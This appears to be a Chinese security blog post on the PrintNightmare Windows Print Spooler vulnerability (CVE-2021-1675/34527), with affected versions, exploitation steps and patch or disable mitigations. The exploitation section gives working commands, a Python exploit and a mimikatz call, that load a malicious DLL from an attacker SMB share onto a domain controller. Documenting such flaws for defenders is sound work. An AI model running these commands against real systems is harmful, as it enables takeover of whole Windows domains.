**目录**

[一：漏洞概述](#t0 "一：漏洞概述")

[二：影响范围](#t1 "二：影响范围")

[三：漏洞利用](#t2 "三：漏洞利用")

[使用python脚本攻击](#t3 "使用python脚本攻击")

[使用mimikatz攻击](#t4 "使用mimikatz攻击")

[四：漏洞防护](#t5 "四：漏洞防护")

[4.1 官方升级](#t6 "4.1 官方升级")

[4.2 临时防护措施](#t7 "4.2 临时防护措施")

* * *

一：漏洞概述
------

       2021年6月9日，微软发布6月安全更新补丁，修复了50个安全漏洞，其中包括一个Windows Print Spooler权限提升漏洞（CVE-2021-1675），该漏洞被标记为[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)漏洞。普通用户可以利用此漏洞以管理员身份在运行打印后台处理程序服务的系统上执行代码。然而在6月21日，微软又将该漏洞升级为远程代码执行漏洞。

      2021年6月29日，有安全研究员在github公布了打印机漏洞利用exp。但是令人没想到的是，该漏洞利用exp针对的漏洞是一个与CVE-2021-1675类似但不完全相同的漏洞，并且微软针对该漏洞并没有推送更新补丁，所以也就意味着这是一个0day漏洞，这个0day漏洞被称为PrintNightmare，最新的漏洞编号为CVE-2021-34527。

        Print Spooler是Windows系统中用于管理打印相关事务的服务，在Windows系统中用于后台执行打印作业并处理与打印机的交互，管理所有本地和网络打印队列及控制所有打印工作。该服务对应的进程 spoolsv.exe 以SYSTEM权限执行，其设计中存在的一个严重缺陷，由于 SeLoadDriverPrivilege 中鉴权存在代码缺陷，参数可以被攻击者控制，普通用户可以通过 RPC 触发 RpcAddPrinterDrive 绕过安全检查并写入恶意驱动程序。如果域控存在此漏洞，域中普通用户即可通过连接域控 Spooler 服务，向域控中添加恶意驱动，从而控制整个域环境。

二：影响范围
------

**受影响版本**

*   Windows Server 2012 R2 (Server Core installation)
*   Windows Server 2012 R2
*   Windows Server 2012 (Server Core installation)
*   Windows Server 2012
*   Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
*   Windows Server 2008 R2 for x64-based Systems Service Pack 1
*   Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
*   Windows Server 2008 for x64-based Systems Service Pack 2
*   Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
*   Windows Server 2008 for 32-bit Systems Service Pack 2
*   Windows RT 8.1
*   Windows 8.1 for x64-based systems
*   Windows 8.1 for 32-bit systems
*   Windows 7 for x64-based Systems Service Pack 1
*   Windows 7 for 32-bit Systems Service Pack 1
*   Windows Server 2016  (Server Core installation)
*   Windows Server 2016
*   Windows 10 Version 1607 for x64-based Systems
*   Windows 10 Version 1607 for 32-bit Systems
*   Windows 10 for x64-based Systems
*   Windows 10 for 32-bit Systems
*   Windows Server, version 20H2 (Server Core Installation)
*   Windows 10 Version 20H2 for ARM64-based Systems
*   Windows 10 Version 20H2 for 32-bit Systems
*   Windows 10 Version 20H2 for x64-based Systems
*   Windows Server, version 2004 (Server Core installation)
*   Windows 10 Version 2004 for x64-based Systems
*   Windows 10 Version 2004 for ARM64-based Systems
*   Windows 10 Version 2004 for 32-bit Systems
*   Windows 10 Version 21H1 for 32-bit Systems
*   Windows 10 Version 21H1 for ARM64-based Systems
*   Windows 10 Version 21H1 for x64-based Systems
*   Windows 10 Version 1909 for ARM64-based Systems
*   Windows 10 Version 1909 for x64-based Systems
*   Windows 10 Version 1909 for 32-bit Systems
*   Windows Server 2019  (Server Core installation)
*   Windows Server 2019
*   Windows 10 Version 1809 for ARM64-based Systems
*   Windows 10 Version 1809 for x64-based Systems
*   Windows 10 Version 1809 for 32-bit Systems

三：漏洞利用
------

**漏洞过程**

首先我们搭建一个SMB匿名共享，放我们的恶意dll文件。

工具运行后会先检测C:\\Windows\\System32\\DriverStore\\FileRepository目录下 ntprint.inf\_amd64\_xx 文件名，自动替换。

![](https://img-blog.csdnimg.cn/2021070114411714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后远程拉取我们设置的匿名共享的恶意dll文件：

*   py脚本会将我们的恶意dll文件传到域控的 C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ 目录下并执行。
*   而mimikatz则是将我们的恶意dll文件传到域控的 C:\\Windows\\System32\\spool\\drivers\\x64\\old\\2\\ 目录下并执行(会创建old\\2\\目录)

### 检测是否存在漏洞

先检测目标机器是否开启MS-RPRN服务，存在即可以尝试利用：

```
python3 rpcdump.py @10.211.55.14 | grep MS-RPRN
```


![](https://img-blog.csdnimg.cn/20210701151256802.png)

### 使用python脚本攻击

```
python3 CVE-2021-1675.py xie.com/test:P@ss1234@10.211.55.14 '\\10.211.55.7\share\1.dll'
```


![](https://img-blog.csdnimg.cn/20210701111355549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 使用mimikatz攻击

```
mimikatz.exe      
misc::printnightmare /server:10.211.55.14 /library:\\10.211.55.7\share\1.dll
```


![](https://img-blog.csdnimg.cn/20210701111907271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

实战测试攻击Windows Server2016、2019均能成功上线。Server2012只能上传恶意dll，不能执行上线。

四：漏洞防护
------

### 4.1 官方升级

目前微软官方已针对支持的系统版本发布了修复该漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，官方下载链接：

[Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675 "Security Update Guide - Microsoft Security Response Center")

注：由于网络问题、计算机环境问题等原因，Windows Update的补丁更新可能出现失败。用户在安装补丁后，应及时检查补丁是否成功更新。

右键点击Windows图标，选择“设置(N)”，选择“更新和安全”-“Windows更新”，查看该页面上的提示信息，也可点击“查看更新历史记录”查看历史更新情况。

针对未成功安装的更新，可点击更新名称跳转到微软官方下载页面，建议用户点击该页面上的链接，转到“Microsoft更新目录”网站下载独立程序包并安装。

### 4.2 临时防护措施

若相关用户暂时无法进行补丁更新，可通过禁用Print Spooler服务来进行缓解：

一：在服务应用（services.msc）中找到Print Spooler服务。

![](https://img-blog.csdnimg.cn/20210703091512255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

二：停止运行服务，同时将“启动类型”修改为“禁用”。

![](https://img-blog.csdnimg.cn/20210703091620364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考：[Windows Print Spooler权限提升漏洞（CVE-2021-1675）通告 – 绿盟科技技术博客](http://blog.nsfocus.net/windows-print-spoolercve/ "Windows Print Spooler权限提升漏洞（CVE-2021-1675）通告 – 绿盟科技技术博客")

           [https://github.com/hhlxf/PrintNightmare](https://github.com/hhlxf/PrintNightmare "https://github.com/hhlxf/PrintNightmare")

           [Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-1675 "Security Update Guide - Microsoft Security Response Center")

           [漏洞风险提示 | CVE-2021-1675 - Windows Print Spooler 远程命令执行漏洞](https://mp.weixin.qq.com/s/fVzaBhHbI6QTlnvnK0nMug "漏洞风险提示 |  CVE-2021-1675 - Windows Print Spooler 远程命令执行漏洞")